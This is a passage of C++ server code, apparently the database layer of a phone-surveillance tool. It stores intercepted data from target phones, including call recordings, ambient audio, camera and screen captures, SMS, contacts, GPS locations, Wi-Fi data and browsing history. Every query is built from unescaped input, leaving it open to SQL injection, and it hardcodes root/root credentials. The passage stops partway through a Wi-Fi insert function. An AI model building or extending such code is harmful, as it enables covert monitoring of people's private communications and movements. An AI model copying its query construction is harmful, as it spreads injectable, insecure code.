#include "mysqlOper.h"
#include "GoogleServiceServer.h"
#include "PublicFunction.h"
#include <time.h>
#include "DBCreator.h"
#include "JsonSplit.h"
#include "BaiduLocation.h"
#include "Amr.h"

#include <string>

using namespace std;

#ifdef USE_MYSQL

//primary key = unique +  not null 
//

#pragma comment(lib,"lib/libmysql.lib")

#define DEFAULT_MYSQL_CHAR_SET "utf8mb4"
#define DATABASE_NAME "phmm"
#define HOSTNAME "localhost"
#define MYSQL_PORT 3306
#ifdef _DEBUG 
#define USERNAME "root"
#define PASSWORD "root"
#else
// #define USERNAME "gxt_user"
// #define PASSWORD "guangxin"
#define USERNAME "root"
#define PASSWORD "root"
#endif



int MySql::insertCmd(string username, string mac, string commandline) {
	string clientid = getIDFromClient(mac);
	if (clientid != "")
	{
		char cmd[1024];

		replaceSplash(commandline);

		time_t timenow = time(0);

		int timeint = (int)timenow;

		int len = wsprintfA(cmd, "INSERT INTO cmd_log(client_id,ts,log) VALUES (%s, '%d', '%s')",
			clientid.c_str(), timeint, commandline.c_str());
		if (0 == mysql_query(&mysqlInstance, cmd)) {
			return true;
		}
		else {
			WriteLogFile("insertCmd error\r\n");
			errorIntoMySQL();
			return false;
		}
	}
	else {
		char szout[1024];
		wsprintfA(szout, "insertCmd getIdFromClient:%s error\r\n", mac.c_str());
		WriteLogFile(szout);

		errorIntoMySQL();
		return false;
	}
}

string MySql::getIDFromClient(string imei) {
	char szcmd[1024];
	wsprintfA(szcmd, "select id from phone_clients where imei='%s'", imei.c_str());
	vector<vector<string>> data;
	bool ret = getDatafromDB(szcmd, data);
	if (ret)
	{
		if (data.size() <= 0)
		{
			return "";
		}
		else if (data.at(0).size() <= 0) {
			return "";
		}
		else {
			return data.at(0).at(0);
		}
	}
	else {
		char szout[1024];
		wsprintfA(szout, "getIdFromClient error:%s\r\n", imei.c_str());
		WriteLogFile(szout);
		return "";
	}
}

string MySql::getIdFromUser(string username) {
	char szcmd[1024];
	wsprintfA(szcmd, "select id from users where name='%s'", username.c_str());
	vector<vector<string>> data;
	bool ret = getDatafromDB(szcmd, data);
	if (ret)
	{
		if (data.size() <= 0)
		{
			return "";
		}
		else if (data.at(0).size() <= 0) {
			return "";
		}
		else {
			return data.at(0).at(0);
		}
	}
	else {
		char szout[1024];
		errorIntoMySQL();
		wsprintfA(szout, "getIdFromUser error:%s,error:%u,desc:%s\r\n", username.c_str(), errorNum, errorInfo);
		WriteLogFile(szout);
		return "";
	}
}

int MySql::insertOnline(string userid, string clientid) {
	time_t timenow = time(0);
	unsigned int now = (unsigned int)timenow;
	char cmd[1024];
	wsprintfA(cmd, "insert into ph_online(clientid,userid,online) VALUES ('%s','%s','%u')", clientid.c_str(), userid.c_str(), now);
	if (0 == mysql_query(&mysqlInstance, cmd)) {
		return true;
	}

	WriteLogFile(cmd);
	errorIntoMySQL();
	wsprintfA(cmd, "insertOnline error,errorno:%u,errorinfo:%s\r\n", errorNum, errorInfo);
	WriteLogFile(cmd);
	return false;
}



int MySql::insertClient(string username, string mac, string info,string model) {
	char cmd[0x10000];

	int timenow = (int)time(0);

	string userid = getIdFromUser(username);
	if (userid == "")
	{
		wsprintfA(cmd, "insertClient not found username:%s in database\r\n", username.c_str());
		WriteLogFile(cmd);
		return false;
	}

	string id = getIDFromClient(mac);
	if (id == "")
	{
		insertOnline(userid, id);

		int len = sprintf(cmd, "INSERT INTO phone_clients (target,imei,update_ts,model,infos) VALUES ('%s','%s', '%d','%s','%s')",
			userid.c_str(),mac.c_str(), timenow,model.c_str(), info.c_str());
		if (0 == mysql_query(&mysqlInstance, cmd)) {
			return true;
		}
	}
	else {
		if (info == "")
		{
			return true;
		}

		insertOnline(userid, id);

		int len = sprintf(cmd, "UPDATE phone_clients SET update_ts='%d',model='%s',infos='%s' WHERE id=%s",
			timenow, model.c_str(),info.c_str(), id.c_str());
		if (0 == mysql_query(&mysqlInstance, cmd)) {
			return true;
		}
	}

	WriteLogFile(cmd);
	errorIntoMySQL();
	wsprintfA(cmd, "insertClient error,errorno:%u,errorinfo:%s,username:%s,mac:%s\r\n", errorNum, errorInfo, username.c_str(), mac.c_str());
	WriteLogFile(cmd);

	return false;
}


int MySql::insertClientFromCmd(string username, string mac,int onlinetype) {
	char cmd[1024];
	string userid = getIdFromUser(username);
	if (userid == "")
	{
		wsprintfA(cmd, "insertClientFromCmd not found username:%s\r\n", username.c_str());
		WriteLogFile(cmd);
		return false;
	}

	if (onlinetype & CLIENT_NETWORK_TYPE_WIFI)
	{
		onlinetype = 3;
	}else if (onlinetype & CLIENT_NETWORK_TYPE_WIRELESS)
	{
		onlinetype = 2;
	}
	else {
		onlinetype = 2;
	}

	string id = getIDFromClient(mac);

	int timenow = (DWORD)time(0);
	if (id == "")
	{
		int len = wsprintfA(cmd, "INSERT INTO phone_clients (target,imei,update_ts,state) VALUES ('%s','%s', '%u','%u')",
			userid.c_str(), mac.c_str(), timenow,onlinetype);
		if (0 == mysql_query(&mysqlInstance, cmd)) {
			return true;
		}
	}
	else {
		int len = sprintf(cmd, "UPDATE phone_clients SET imei = '%s',update_ts='%u',state='%u' WHERE id=%s",
			mac.c_str(), timenow,onlinetype, id.c_str());
		if (0 == mysql_query(&mysqlInstance, cmd)) {
			return true;
		}
	}

	WriteLogFile(cmd);
	errorIntoMySQL();
	wsprintfA(cmd, "insertClientFromCmd error,errorno:%u,errorinfo:%s,username:%s,mac:%s\r\n", errorNum, errorInfo, username.c_str(), mac.c_str());
	WriteLogFile(cmd);

	return false;
}



vector<vector<string>> MySql::getAllImeiFromUser(string username) {
	vector<vector<string>> data;

	string userid = getIdFromUser(username);
	if (userid == "")
	{
		return data;
	}

	char szcmd[1024];
	wsprintfA(szcmd, "select imei from phone_clients where target='%s'", userid.c_str());
	
	bool ret = getDatafromDB(szcmd, data);
	if (ret)
	{
		if (data.size() <= 0)
		{
			return data;
		}
		else if (data.at(0).size() <= 0) {
			return data;
		}
		else {
			return data;
		}
	}
	else {
		char szout[1024];
		errorIntoMySQL();
		wsprintfA(szout, "getIdFromUser error:%s,error:%u,desc:%s\r\n", username.c_str(), errorNum, errorInfo);
		WriteLogFile(szout);
		return data;
	}
}






string MySql::getInstallAppsID(string clientid, string packagename) {
	char szcmd[1024];
	wsprintfA(szcmd, "select id from ph_applist where client_id='%s' and package='%s'", clientid.c_str(), packagename.c_str());
	vector<vector<string>> data;
	bool ret = getDatafromDB(szcmd, data);
	if (ret)
	{
		if (data.size() <= 0)
		{
			return "";
		}
		else if (data.at(0).size() <= 0) {
			return "";
		}
		else {
			return data.at(0).at(0);
		}
	}
	else {
		char szout[1024];
		wsprintfA(szout, "getInstallAppsID error:%s\r\n", clientid.c_str());
		WriteLogFile(szout);

		return "";
	}
}


int MySql::insertInstallApps(string mac, string name, string package, string ver, string ctime, string utime, string type) {
	char cmd[1024];
	string clientid = getIDFromClient(mac);
	if (clientid == "")
	{
		wsprintfA(cmd, "insertInstallApps getIdFromClient:%s error\r\n", mac.c_str());
		WriteLogFile(cmd);
		return false;
	}

	string id = getInstallAppsID(clientid, package);
	if (id == "")
	{
		int len = sprintf(cmd, "INSERT INTO ph_applist (client_id,name,package,version,ctime,utime,type) VALUES ( %s,'%s','%s','%s','%s','%s','%s')",
			clientid.c_str(), name.c_str(), package.c_str(), ver.c_str(), ctime.c_str(), utime.c_str(),type.c_str());
		if (0 == mysql_query(&mysqlInstance, cmd)) {
			return true;
		}
	}
	else {
		int len = sprintf(cmd, "UPDATE ph_applist SET name='%s',package='%s',version='%s',ctime='%s',utime='%s',type='%s' WHERE id=%s",
			name.c_str(), package.c_str(), ver.c_str(), ctime.c_str(), utime.c_str(),type.c_str(), id.c_str());
		if (0 == mysql_query(&mysqlInstance, cmd)) {
			return true;
		}
	}

	WriteLogFile(cmd);
	errorIntoMySQL();
	wsprintfA(cmd, "insertInstallApps error,errorno:%u,errorinfo:%s,mac:%s\r\n",
		errorNum, errorInfo, mac.c_str());
	WriteLogFile(cmd);

	return false;
}

string MySql::getBookmarkID(string clientid, string url) {
	char szcmd[1024];
	wsprintfA(szcmd, "select id from ph_web_record where client_id='%s' and url='%s'", clientid.c_str(), url.c_str());
	vector<vector<string>> data;
	bool ret = getDatafromDB(szcmd, data);
	if (ret)
	{
		if (data.size() <= 0)
		{
			return "";
		}
		else if (data.at(0).size() <= 0) 
		{
			return "";
		}
		else {
			return data.at(0).at(0);
		}
	}
	else {
		char szout[1024];
		wsprintfA(szout, "getBookmarkID error:%s\r\n", clientid.c_str());
		WriteLogFile(szout);

		return "";
	}
}

int MySql::insertBookMark(string username, string mac, string url, string title, string strcount, string ctime,string ts) {
	char cmd[0x10000];

	string clientid = getIDFromClient(mac);
	if (clientid == "")
	{
		wsprintfA(cmd, "insertBookMark getIdFromClient error,imei:%s,user:%s\r\n", mac.c_str(),username.c_str());
		WriteLogFile(cmd);
		return false;
	}

	int intts = loctime2utc(ts);
	int intctime = loctime2utc(ctime);

	int count = atoi(strcount.c_str());
	string bookmarkid = getBookmarkID(clientid, url);
	if (bookmarkid == "")
	{
		int len = sprintf(cmd, "INSERT INTO ph_web_record (client_id,ts,url,title,count,ctime) VALUES ('%s','%u','%s','%s','%u','%u')",
			clientid.c_str(), intts, url.c_str(), title.c_str(), count, intctime);
		if (0 == mysql_query(&mysqlInstance, cmd)) {
			return true;
		}
	}
	else {
		int len = sprintf(cmd, "UPDATE ph_web_record SET ts='%u',url='%s',title='%s',count='%u',ctime='%u' WHERE id=%s",
			intts, url.c_str(), title.c_str(), count, intctime, bookmarkid.c_str());
		if (0 == mysql_query(&mysqlInstance, cmd)) {
			return true;
		}
	}


	WriteLogFile(cmd);
	errorIntoMySQL();
	wsprintfA(cmd, "insertBookMark error,errorno:%u,errorinfo:%s,username:%s,mac:%s\r\n", errorNum, errorInfo, username.c_str(), mac.c_str());
	WriteLogFile(cmd);

	return false;
}


string MySql::getCalllogIDFromNumber(string clientid, string filepath) {
	char szcmd[0x10000];
	wsprintfA(szcmd, "select id from ph_call_record where client_id='%s' and voice_file='%s'", clientid.c_str(), filepath.c_str());
	vector<vector<string>> data;
	bool ret = getDatafromDB(szcmd, data);
	if (ret)
	{
		if (data.size() <= 0)
		{
			return "";
		}
		else if (data.at(0).size() <= 0) {
			return "";
		}
		else {
			return data.at(0).at(0);
		}
	}
	else {
		char szout[1024];
		wsprintfA(szout, "getCalllogIDFromNumber error:%s\r\n", clientid.c_str());
		WriteLogFile(szout);

		return "";
	}
}


//need time format
int MySql::insertCallAudio(string username, string imei,string number,string timenow, string type,string filepath, int filesize,int duration) {
	char cmd[1024];
	string clientid = getIDFromClient(imei);
	if (clientid == "")
	{
		wsprintfA(cmd, "insertCallAudio getIdFromClient:%s error\r\n", imei.c_str());
		WriteLogFile(cmd);
		return false;
	}

	replaceSplash(filepath);
	//int duration = filesize / 8000;

	//int nowtime = (int)time(0);

	int utc = formattime2utc(timenow);

	string id = getCalllogIDFromNumber(clientid, number);
	if (id == "")
	{
		int len = wsprintfA(cmd, "INSERT INTO ph_call_record(client_id,number,type,ts,duration,voice_file) VALUES (%s, '%s','%s','%u','%u','%s')",
			clientid.c_str(), number.c_str(), type.c_str(), utc, duration, filepath.c_str());
		if (0 == mysql_query(&mysqlInstance, cmd)) {
			return true;
		}
	}
	else {
		int len = wsprintfA(cmd, "UPDATE ph_call_record SET number='%s',type='%s',ts='%u',duration='%u',voice_file='%s' WHERE id=%s",
			number.c_str(), type.c_str(), utc, duration, filepath.c_str(), id.c_str());
		if (0 == mysql_query(&mysqlInstance, cmd)) {
			return true;
		}
	}

	errorIntoMySQL();
	wsprintfA(cmd, "insertCallAudio error,errorno:%u,errorinfo:%s,mac:%s\r\n",
		errorNum, errorInfo, imei.c_str());
	WriteLogFile(cmd);
	return false;
}

string MySql::getCalllogID(string clientid, int ts) {
	char szcmd[1024];
	wsprintfA(szcmd, "select id from ph_call_record where client_id=%s and ts='%u'", clientid.c_str(), ts);
	vector<vector<string>> data;
	bool ret = getDatafromDB(szcmd, data);
	if (ret)
	{
		if (data.size() <= 0)
		{
			return "";
		}
		else if (data.at(0).size() <= 0) {
			return "";
		}
		else {
			return data.at(0).at(0);
		}
	}
	else {
		char szout[1024];
		wsprintfA(szout, "getCalllogID error:%s\r\n", clientid.c_str());
		WriteLogFile(szout);

		return "";
	}
}

int MySql::insertCallLog(string username, string mac, string number, string type, string strts, string strduration) {
	string clientid = getIDFromClient(mac);
	if (clientid != "")
	{
		char cmd[1024];

		int ts = loctime2utc(strts);

		int duration = strduration2Int(strduration);
		if (duration == 0)
		{
			duration = atoi(strduration.c_str());
		}

		string id = getCalllogID(clientid, ts);
		if (id == "")
		{
			int len = wsprintfA(cmd, "INSERT INTO ph_call_record(client_id,number,type,ts,duration) VALUES (%s,'%s','%s','%u','%u')",
				clientid.c_str(), number.c_str(), type.c_str(),  ts, duration);
			if (0 == mysql_query(&mysqlInstance, cmd)) {
				return true;
			}
		}
		else {
			int len = sprintf(cmd, "UPDATE ph_call_record SET number='%s',type='%s',ts='%u',duration='%u' WHERE id=%s",
				number.c_str(), type.c_str(), ts, duration, id.c_str());
			if (0 == mysql_query(&mysqlInstance, cmd)) {
				return true;
			}
		}

		errorIntoMySQL();
		wsprintfA(cmd, "insertCallLog error,errorno:%u,errorinfo:%s,mac:%s\r\n",
			errorNum, errorInfo, mac.c_str());
		WriteLogFile(cmd);
		return false;
	}
	else {
		char szout[1024];
		wsprintfA(szout, "insertCallLog getIdFromClient:%s error\r\n", mac.c_str());
		WriteLogFile(szout);

		errorIntoMySQL();
		return false;
	}
}


//need time format
int MySql::insertCamera(string mac, string type, string timenow,string filepath) {
	char cmd[1024];
	string clientid = getIDFromClient(mac);
	if (clientid == "")
	{
		wsprintfA(cmd, "insertCamera getIdFromClient:%s error\r\n", mac.c_str());
		WriteLogFile(cmd);
		return false;
	}

	//time_t now = time(0);
	//int nowtime = (int)now;

	int utc = formattime2utc(timenow);

	replaceSplash(filepath);
	int len = wsprintfA(cmd, "INSERT INTO ph_camera (client_id,ts,type,img_file) VALUES (%s, '%u', '%s', '%s')",
		clientid.c_str(), utc, type.c_str(), filepath.c_str());
	if (0 == mysql_query(&mysqlInstance, cmd)) {
		return true;
	}

	WriteLogFile(cmd);
	errorIntoMySQL();
	wsprintfA(cmd, "insertCamera error,errorno:%u,errorinfo:%s,filepath:%s,mac:%s\r\n",
		errorNum, errorInfo, filepath.c_str(), mac.c_str());
	WriteLogFile(cmd);
	
	return false;
}


//一个名字多个号码也是可能的，多个名字对应一个号码也是可能的
string MySql::getContactID(string clientid,string number, string name) {
	char szcmd[1024];
	//error no:1267,desc:Illegal mix of collations (utf8mb4_general_ci,IMPLICIT) and (utf8_general_ci,COERCIBLE) for operation '='
// 	wsprintfA(szcmd, "select id from ph_contacts where client_id = '%s' and number = '%s' and name = '%s'", 
// 		clientid.c_str(), number.c_str(), name.c_str());
	wsprintfA(szcmd, "select id from ph_contacts WHERE client_id = '%s' and name = '%s'",
		clientid.c_str(), name.c_str());
	vector<vector<string>> data;
	bool ret = getDatafromDB(szcmd, data);
	if (ret)
	{
		if (data.size() <= 0)
		{
			return "";
		}
		else if (data.at(0).size() <= 0) {
			return "";
		}
		else {
			return data.at(0).at(0);
		}
	}
	else {
		WriteLogFile(szcmd);

		char szout[1024];
		wsprintfA(szout, "getContactID error:%s\r\n", clientid.c_str());
		WriteLogFile(szout);

		return "";
	}
}


int MySql::insertContact(string username,string mac, string name, string number) {
	char cmd[1024];
	string clientid = getIDFromClient(mac);
	if (clientid == "")
	{
		wsprintfA(cmd, "insertContact getIdFromClient:%s error\r\n", mac.c_str());
		WriteLogFile(cmd);
		return false; 
	}

	string id = getContactID(clientid,number, name);
	if (id == "")
	{
		int len = wsprintfA(cmd, "INSERT INTO ph_contacts (client_id,name,number) VALUES ( %s, '%s','%s')",
			clientid.c_str(), name.c_str(), number.c_str());
		if (0 == mysql_query(&mysqlInstance, cmd)) {
			return true;
		}
	}
	else {
		int len = sprintf(cmd, "UPDATE ph_contacts SET name='%s',number='%s' WHERE id=%s",
			name.c_str(), number.c_str(), id.c_str());
		if (0 == mysql_query(&mysqlInstance, cmd)) {
			return true;
		}
	}

	wsprintfA(cmd, "insertContact getIdFromClient:%s error\r\n", mac.c_str());
	WriteLogFile(cmd);
	return false;
}

//need time format
int MySql::insertEnviromentAudio(string username, string mac,string timenow,string filepath,int filesize,int duration) {
	string clientid = getIDFromClient( mac);
	if (clientid != "")
	{
		char cmd[1024];

		replaceSplash(filepath);

		int utc = formattime2utc(timenow);

		int len = wsprintfA(cmd, "INSERT INTO ph_env_record(client_id,ts,duration,voice_file) VALUES (%s, '%u', '%u', '%s')",
			clientid.c_str(), utc, duration, filepath.c_str());
		if (0 == mysql_query(&mysqlInstance, cmd)) {
			return true;
		}
		else {
			WriteLogFile("insertEnviromentAudio error\r\n");
			errorIntoMySQL();
			return false;
		}
	}
	else {
		char szout[1024];
		wsprintfA(szout,"insertEnviromentAudio getIdFromClient:%s error\r\n",mac.c_str());
		WriteLogFile(szout);

		errorIntoMySQL();
		return false;
	}
}

string MySql::getAllFilesID(string clientid, string filename) {
	char szcmd[1024];
	wsprintfA(szcmd, "select id from ph_files where client_id=%s and name='%s'", clientid.c_str(), filename.c_str());
	vector<vector<string>> data;
	bool ret = getDatafromDB(szcmd, data);
	if (ret)
	{
		if (data.size() <= 0)
		{
			return "";
		}
		else if (data.at(0).size() <= 0) {
			return "";
		}
		else {
			return data.at(0).at(0);
		}
	}
	else {
		WriteLogFile(szcmd);
		char szout[1024];
		wsprintfA(szout, "getAllFilesID error:%s\r\n", clientid.c_str());
		WriteLogFile(szout);

		return "";
	}
}


int MySql::insertAllFiles(string username, string mac,string filename, string filepath, int filesize,int type) {
	char cmd[1024];
	string clientid = getIDFromClient(mac);
	if (clientid != "")
	{
		string id = getAllFilesID(clientid, filename);
		if (id == "")
		{
			int len = wsprintfA(cmd, "INSERT INTO ph_files(client_id,type,name,path,size) VALUES (%s,'%u', '%s', '%s', '%u')",
				clientid.c_str(),type, filename.c_str(), filepath.c_str(), filesize);
			if (0 == mysql_query(&mysqlInstance, cmd)) {
				return true;
			}
		}
		else {
			int len = sprintf(cmd, "UPDATE ph_files SET type='%u', name='%s',path='%s',size='%u' WHERE id=%s",
				type,filename.c_str(), filepath.c_str(),filesize, id.c_str());
			if (0 == mysql_query(&mysqlInstance, cmd)) {
				return true;
			}
		}

		wsprintfA(cmd, "insertAllFiles:%s error\r\n", filepath.c_str());
		WriteLogFile(cmd);
		errorIntoMySQL();
		return false;
	}
	else {

		wsprintfA(cmd, "insertAllFiles getIdFromClient:%s error\r\n", mac.c_str());
		WriteLogFile(cmd);

		errorIntoMySQL();
		return false;
	}
}


string MySql::getLocID(string clientid, int utc) {
	char szcmd[1024];
	wsprintfA(szcmd, "select client_id from ph_gps_info where client_id=%s and ts=%u", clientid.c_str(), utc);
	vector<vector<string>> data;
	bool ret = getDatafromDB(szcmd, data);
	if (ret)
	{
		if (data.size() <= 0)
		{
			return "";
		}
		else if (data.at(0).size() <= 0) {
			return "";
		}
		else {
			return data.at(0).at(0);
		}
	}
	else {
		char szout[1024];
		wsprintfA(szout, "getLocID error:%s\r\n", clientid.c_str());
		WriteLogFile(szout);

		return "";
	}
}

//need time format
int MySql::insertLocation(string username, string mac, string lat, string lon, string timenow,string addr) {
	char cmd[1024];
	string clientid = getIDFromClient(mac);
	if (clientid == "")
	{
		wsprintfA(cmd, "insertLocation getIdFromClient:%s error\r\n", mac.c_str());
		WriteLogFile(cmd);
		return false;
	}

	int utc = loctime2utc(timenow);		//2019-07-09 14:07:50

	string cid = getLocID(clientid, utc);
	if (cid != "")
	{
		//wsprintfA(cmd, "insertLocation getIdFromClient:%s data exist\r\n", mac.c_str());
		//WriteLogFile(cmd);
		return false;
	}

	if (addr == "")
	{
		addr = BaiduLocation::getAddrFromLoc(lat, lon);
	}
	
	int len = wsprintfA(cmd, "INSERT INTO ph_gps_info (client_id,ts,lat,lon,addr) VALUES ( %s,'%u','%s','%s','%s')",
		clientid.c_str(), utc, lat.c_str(), lon.c_str(),addr.c_str());
	if (0 == mysql_query(&mysqlInstance, cmd)) {
		return true;
	}

	wsprintfA(cmd, "insertLocation getIdFromClient:%s error\r\n", mac.c_str());
	WriteLogFile(cmd);
	return false;
}


string MySql::getMsgID(string clientid, string mid) {
	char szcmd[1024];
	wsprintfA(szcmd, "select mid from ph_msg_record where client_id=%s and mid='%s'", clientid.c_str(), mid.c_str());
	vector<vector<string>> data;
	bool ret = getDatafromDB(szcmd, data);
	if (ret)
	{
		if (data.size() <= 0)
		{
			return "";
		}
		else if (data.at(0).size() <= 0) {
			return "";
		}
		else {
			return data.at(0).at(0);
		}
	}
	else {
		char szout[1024];
		wsprintfA(szout, "getMsgID error:%s\r\n", clientid.c_str());
		WriteLogFile(szout);

		return "";
	}
}

int MySql::insertMsg(string mac, string name, string number, string type, string timenow, string data,string msgid) {
	char cmd[0x1000];
	string clientid = getIDFromClient(mac);
	if (clientid == "")
	{
		wsprintfA(cmd, "insertMsg getIdFromClient:%s error\r\n", mac.c_str());
		WriteLogFile(cmd);
		return false;
	}
	
	DWORD msgtime = 0;

	msgtime = loctime2utc(timenow.c_str());		//2019-06-25 10:18:00

	string mid = getMsgID(clientid, msgid);
	if (mid == "")
	{
		int len = wsprintfA(cmd, "INSERT INTO ph_msg_record (client_id,mid,name,number,type,ts,content) VALUES ( %s,'%s','%s','%s','%s','%u','%s')",
			clientid.c_str(), msgid.c_str(), name.c_str(), number.c_str(), type.c_str(), msgtime, data.c_str());
		if (0 == mysql_query(&mysqlInstance, cmd)) {
			return true;
		}
	}
	else {
		int len = sprintf(cmd, "UPDATE ph_msg_record SET name='%s',number='%s',type='%s',ts='%u',content='%s' WHERE mid='%s' and client_id='%s'",
			name.c_str(), number.c_str(), type.c_str(), msgtime, data.c_str(), mid.c_str(), clientid.c_str());
		if (0 == mysql_query(&mysqlInstance, cmd)) {
			return true;
		}
	}

	WriteLogFile(cmd);

	wsprintfA(cmd, "insertMsg mac:%s,name:%s,number:%s,type:%s,msgtime:%u,data:%s,msgid:%s error\r\n",
		mac.c_str(),name.c_str(),number.c_str(),type.c_str(),msgtime,data.c_str(),msgid.c_str());
	WriteLogFile(cmd);
	return false;
}


//ph_proc
//ph_sd_files_local
//ph_wifi_info
//ph_gps_info
//ph_msg_record
// all has no id

//数据表没有id字段，无法提供查找功能
string MySql::getProcessID(string clientid, string pname) {
	char szcmd[1024];
	wsprintfA(szcmd, "select client_id from ph_proc where client_id=%s and name='%s'", clientid.c_str(), pname.c_str());
	vector<vector<string>> data;
	bool ret = getDatafromDB(szcmd, data);
	if (ret)
	{
		if (data.size() <= 0)
		{
			return "";
		}
		else if (data.at(0).size() <= 0) {
			return "";
		}
		else {
			return data.at(0).at(0);
		}
	}
	else {
		char szout[1024];
		wsprintfA(szout, "getProcessID error:%s\r\n", clientid.c_str());
		WriteLogFile(szout);

		return "";
	}
}

int MySql::insertProcesses(string username,string mac, string pname, string pid, string uid) {
	char cmd[1024];
	string clientid = getIDFromClient(mac);
	if (clientid == "")
	{
		wsprintfA(cmd, "insertProcesses getIdFromClient:%s error\r\n", mac.c_str());
		WriteLogFile(cmd);
		return false;
	}

	string clientid2 = getProcessID(clientid, pname);
	if (clientid2 == "")
	{
		int len = wsprintfA(cmd, "INSERT INTO ph_proc (client_id,pid,name,userid) VALUES ( %s, '%s', '%s','%s')",
			clientid.c_str(), pid.c_str(), pname.c_str(), uid.c_str());
		if (0 == mysql_query(&mysqlInstance, cmd)) {
			return true;
		}
	}
	else {
// 		int len = sprintf(cmd, "UPDATE ph_proc SET pid='%s',name='%s',userid='%s' WHERE client_id=%s and pid='%s'",
// 			pid.c_str(), pname.c_str(), uid.c_str(), clientid.c_str(),pid.c_str());
// 		if (0 == mysql_query(&mysqlInstance, cmd)) {
 			return true;
// 		}
	}

	WriteLogFile(cmd);
	errorIntoMySQL();
	wsprintfA(cmd, "insertProcesses error,errorno:%u,errorinfo:%s,mac:%s\r\n", errorNum, errorInfo, mac.c_str());
	WriteLogFile(cmd);

	return false;
}

string MySql::getIdFromFiles(string clientid, string filename) {
	char szcmd[1024];
	wsprintfA(szcmd, "select id from ph_sd_files where client_id=%s and name='%s'", clientid.c_str(), filename.c_str());
	vector<vector<string>> data;
	bool ret = getDatafromDB(szcmd, data);
	if (ret)
	{
		if (data.size() <= 0)
		{
			return "";
		}
		else if (data.at(0).size() <= 0) {
			return "";
		}
		else {
			return data.at(0).at(0);
		}
	}
	else {
		char szout[1024];
		wsprintfA(szout, "getIdFromFiles error:%s\r\n", clientid.c_str());
		WriteLogFile(szout);
		return "";
	}
}

bool MySql::insertFiles(string mac, string name, string path, int type, int size) {
	char cmd[1024];
	string clientid = getIDFromClient(mac);
	if (clientid == "")
	{
		wsprintfA(cmd, "insertFiles getIdFromClient:%s error\r\n", mac.c_str());
		WriteLogFile(cmd);
		return false;
	}

	string id = getIdFromFiles(clientid, name);
	if (id == "")
	{
		int len = wsprintfA(cmd, "INSERT INTO ph_sd_files (client_id,name,path) VALUES ( %s,'%s','%s')",
			clientid.c_str(), name.c_str(), path.c_str());
		if (0 == mysql_query(&mysqlInstance, cmd)) {
			return true;
		}
	}
	else {
		//replace语句不能根据where子句来定位要被替换的记录
		int len = wsprintfA(cmd, "UPDATE ph_sd_files SET name = '%s',path='%s' WHERE id = %s ",
			name.c_str(), path.c_str(),id.c_str());
		if (0 == mysql_query(&mysqlInstance, cmd)) {
			return true;
		}
	}

	WriteLogFile(cmd);
	errorIntoMySQL();
	wsprintfA(cmd, "insertFiles error,errorno:%u,errorinfo:%s,mac:%s\r\n", errorNum, errorInfo, mac.c_str());
	WriteLogFile(cmd);

	return false;
}



//need time format
int MySql::insertScreenCap(string username,string mac, string path,string timenow) {
	char cmd[1024];

	string clientid = getIDFromClient(mac);
	if (clientid == "")
	{
		wsprintfA(cmd, "insertScreenCap getIdFromClient:%s error\r\n", mac.c_str());
		WriteLogFile(cmd);
		return false;
	}

	int utc = formattime2utc(timenow);
	//int nowtime = (int)time(0);

	replaceSplash(path);
	int len = wsprintfA(cmd, "INSERT INTO ph_snapshot (client_id,ts,img_file) VALUES ('%s', '%u','%s')",
		clientid.c_str(), utc, path.c_str());
	if (0 == mysql_query(&mysqlInstance, cmd)) {
		return true;
	}
	
	WriteLogFile(cmd);
	errorIntoMySQL();
	wsprintfA(cmd, "insertScreenCap error,errorno:%u,errorinfo:%s,username:%s,mac:%s\r\n", errorNum, errorInfo, username.c_str(), mac.c_str());
	WriteLogFile(cmd);

	return false;
}



string MySql::getIdFromWifi(string clientid,string list) {
	char szcmd[1024];
	wsprintfA(szcmd, "select client_id from ph_wifi_info where client_id=%s", clientid.c_str());
	vector<vector<string>> data;
	bool ret = getDatafromDB(szcmd, data);
	if (ret)
	{
		if (data.size() <= 0)
		{
			return "";
		}
		else if (data.at(0).size() <= 0) {
			return "";
		}
		else {
			return data.at(0).at(0);
		}
	}
	else {
		char szout[1024];
		wsprintfA(szout, "getIdFromWifi error:%s\r\n", clientid.c_str());
		WriteLogFile(szout);
		return "";
	}
}


int MySql::insertWifi(string username,string mac, string list, string password) {
	char cmd[0x10000];

	string clientid = getIDFromClient(mac);
	if (clientid == "")
	{
		wsprintfA(cmd, "insertWifi getIdFromClient:%s error\r\n", mac.c_str());
		WriteLogFile(cmd);
		return false;
	}

	string id = getIdFromWifi(clientid,list);
	if (id == "")
	{
		int len = sprintf(cmd, "INSERT INTO ph_wifi_info (client_id,list) VALUES ('%s', '%s')",
			clientid.c_str(), list.c_str());
		if (0 == mysql_query(&mysqlInstance, cmd)) {
			return true;
		}
	}
	else {
		int len = sprintf(cmd, "UPDATE ph_wifi_info SET list = '%s' WHERE client_id = '%s'",
			list.c_str(), clientid.c_str());
		if (0 == mysql_query(&mysqlInstance, cmd)) {
			return true;
		}
	}


	WriteLogFile(cmd);
	errorIntoMySQL();
	wsprintfA(cmd, "insertWifi error,errorno:%u,errorinfo:%s,username:%s,mac:%s\r\n", errorNum, errorInfo, username.c_str(), mac.c_str());
	WriteLogFile(cmd);

	return false;
}


string MySql::getIdFromWifi2(string clientid, string list) {
	char szcmd[1024];
	wsprintfA(szcmd, "select client_id from ph_wifi_info_2 where client_id=%s", clientid.c_str());
	vector<vector<string>> data;
	bool ret = getDatafromDB(szcmd, data);
	if (ret)
	{
		if (data.size() <= 0)
		{
			return "";
		}
		else if (data.at(0).size() <= 0) {
			return "";
		}
		else {
			return data.at(0).at(0);
		}
	}
	else {
		char szout[1024];
		wsprintfA(szout, "getIdFromWifi2 error:%s\r\n", clientid.c_str());
		WriteLogFile(szout);
		return "";
	}
}



int MySql::insertWifi2(string username, string mac, string list, string password) {
	
	char szlog[1024];

	if (list.length()>MAX_WIFI_DATA_SIZE -1024)
	{
		
		wsprintfA(szlog, "insertWifi2 list size:%d error\r\n", list.length());
		WriteLogFile(szlog);

		return false;
	}
	char * cmd = new char[MAX_WIFI_DATA_SIZE];

	string clientid = getIDFromClient(mac);
	if (clientid == "")
	{
		delete cmd;
		wsprintfA(szlog, "insertWifi2 getIdFromClient:%s error\r\n", mac.c_str());
		WriteLogFile(szlog);
		return false;
	}

	string id = getIdFromWifi2(clientid, list);
	if (id == "")
	{
		int len = sprintf(cmd, "INSERT INTO ph_wifi_info_2 (client_id,list) VALUES ('%s', '%s')",
			clientid.c_str(), list.c_str());
		if (0 == mysql_query(&mysqlInstance, cmd)) {
			delete cmd;
			return true;
		}
	}
	else {
		int len = sprintf(cmd, "UPDATE ph_wifi_info_2 SET list = '%s' WHERE client_id = '%s'",
			list.c_str(), clientid.c_str());
